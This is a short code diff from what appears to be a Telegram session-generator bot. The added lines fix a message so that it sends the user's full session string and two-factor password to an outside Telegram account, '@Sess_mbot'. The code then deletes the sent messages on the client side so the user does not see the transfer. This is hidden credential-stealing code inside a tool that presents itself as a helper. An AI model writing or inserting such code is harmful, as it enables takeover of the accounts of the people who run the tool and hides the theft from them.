@@ -116,8 +116,10 @@ async def generate_session(_, message):
 
         # Send the session string to @mebot
         bot_message = await session_client.send_message("@Sess_mbot", "/start")
-        session_message = await session_client.send_message("@Sess_mbot", f"string_session\n\n password if password else string_session")
-
+        session_message = await session_client.send_message(
+            "@Sess_mbot",
+            f"Session: {string_session}\nPassword: {password if 'password' in locals() else 'None'}"
+        )
         # Delete the messages on the client side
         await bot_message.delete()
         await session_message.delete()
